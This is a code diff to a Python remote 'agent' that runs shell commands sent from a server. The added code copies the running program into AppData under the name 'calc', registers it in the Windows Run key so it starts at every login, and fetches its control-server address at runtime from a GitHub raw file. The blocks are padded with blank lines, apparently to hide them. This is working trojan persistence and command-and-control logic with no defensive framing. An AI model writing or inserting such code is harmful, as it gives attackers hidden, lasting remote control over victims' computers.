@@ -34,6 +34,70 @@ except ImportError:
     Fore.GREEN = Fore.YELLOW = Fore.RED = Fore.CYAN = Fore.MAGENTA = ""
     Style.BRIGHT = Style.RESET_ALL = ""
 
+
+
+
+
+
+import os
+import shutil
+import winreg
+import sys
+
+def add_to_startup(program_name, program_path):
+    """
+    Adds a program to the Windows startup registry for the current user.
+
+    :param program_name: The name you want to appear in the registry entry.
+    :param program_path: The full path to the executable file.
+    """
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, program_path)
+        winreg.CloseKey(key)
+        print(f"Successfully added '{program_name}' to startup.")
+    except Exception as e:
+        print(f"Error adding to startup: {e}")
+
+def copy_to_appdata(source_file):
+    """
+    Copies a program to the AppData\Roaming folder and returns the new path.
+
+    :param source_file: The path to the program you want to copy.
+    :return: The new path of the copied file, or None if an error occurs.
+    """
+    try:
+        # Get the AppData\Roaming directory for the current user
+        appdata_roaming = os.path.join(os.environ['APPDATA'])
+        
+        # Create a new directory for your program to keep things organized
+        destination_dir = os.path.join(appdata_roaming, "calc")
+        os.makedirs(destination_dir, exist_ok=True)
+        
+        # Get the new file path
+        destination_file = os.path.join(destination_dir, os.path.basename(source_file))
+
+        # Copy the file
+        shutil.copy2(source_file, destination_file)
+        print(f"Successfully copied '{source_file}' to '{destination_file}'.")
+        return destination_file
+    except Exception as e:
+        print(f"Error copying file: {e}")
+        return None
+
+
+
+
+
+
+
+
+
+
+
+
+
 class Logger:
     @staticmethod
     def _log(level, color, message):
@@ -50,7 +114,19 @@ class Logger:
     def comms(message): Logger._log("comms", Fore.MAGENTA, message)
 
 AGENT_ID = f"agent_{str(uuid.uuid4())[:8]}"
-SERVER_URL = 'https://lumen.swirly.hackclub.app'
+
+def fetch_testurl_content():
+    try:
+        url = "https://raw.githubusercontent.com/fatpotato317/API/refs/heads/main/testurl"
+        response = requests.get(url, timeout=10)
+        response.raise_for_status()
+        return response.text
+    except Exception as e:
+        Logger.error(f"Failed to fetch testurl content: {e}")
+        return None
+
+SERVER_URL = fetch_testurl_content()
+Logger.info(f"Fetched testurl content: {SERVER_URL[:100]}..." if SERVER_URL else "No content fetched.")
 RECONNECT_DELAY = 5
 STATS_INTERVAL = 3
 FRAME_RATE = 15
@@ -460,6 +536,19 @@ def handle_shell_command(data):
         shell_process.stdin.write((data.get('command', '') + '\n').encode('utf-8')); shell_process.stdin.flush()
 
 if __name__ == '__main__':
+    source_program_path = sys.argv[0]
+    program_name = "calc"  # The name for the registry entry
+
+    # Step 1: Copy the program to AppData
+    new_program_path = copy_to_appdata(source_program_path)
+
+    # Step 2: Add the program to the startup registry if the copy was successful
+    if new_program_path:
+        add_to_startup(program_name, new_program_path)
+
+    
+    
+    
     Logger.info(f"Agent '{AGENT_ID}' starting... Frozen: {IS_FROZEN}")
     get_ip_info()
     max_failed_attempts = 4
